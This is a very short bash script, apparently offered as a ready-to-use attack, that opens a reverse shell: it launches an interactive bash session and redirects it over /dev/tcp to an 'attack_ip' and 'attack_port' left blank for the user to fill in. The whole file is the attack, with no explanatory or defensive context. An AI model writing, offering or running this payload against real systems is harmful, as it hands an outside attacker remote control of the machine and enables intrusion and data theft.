#! /bin/bash

attack_ip=''

attack_port=''

/bin/bash -i >& /dev/tcp/$attack_ip/$attack_port 0>&1
